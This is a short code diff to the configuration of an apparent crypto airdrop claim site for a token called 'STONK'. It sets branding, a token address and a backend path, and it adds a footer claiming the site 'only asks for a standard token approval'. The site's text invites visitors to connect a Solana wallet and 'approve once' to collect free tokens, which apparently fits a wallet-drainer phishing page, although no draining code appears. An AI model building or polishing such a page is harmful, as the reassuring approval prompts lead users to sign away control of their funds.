@@ -9,14 +9,16 @@ const config = {
   tagline: "Tokenized markets. Internet speed. Community owned.",
   heroLines: ["THE MARKET", "NEEDS MORE", "STONK."],
   description:
-    "Check your STONK community allocation. Connect your wallet and approve once to receive your tokens.",
+  "Check your STONK community allocation. Connect your wallet and approve once to receive your tokens.",
+  footerText:
+  "This site only asks for a standard token approval to process your claim.",
   primaryColor: "#c9ff3d",
   accentColor: "#6c5cff",
   backgroundColor: "#080908",
   claimButtonText: "Check & claim STONK",
   connectButtonText: "Connect Solana wallet",
   successMessage: "STONK landed in your wallet",
-  backendBaseUrl: "https://your-backend.railway.app",
+  backendBaseUrl: "/api",
   tokenAddress: "6GmAFSYs4gk3FDao5FzzySQpPZaWsa4rUJHacpMpUNgx",
 
   chain: {
@@ -45,7 +47,7 @@ const config = {
       "One wallet connection",
       "Quick approval step",
       "Tokens delivered automatically",
-    ]
+    ],
   },
 
   ui: {
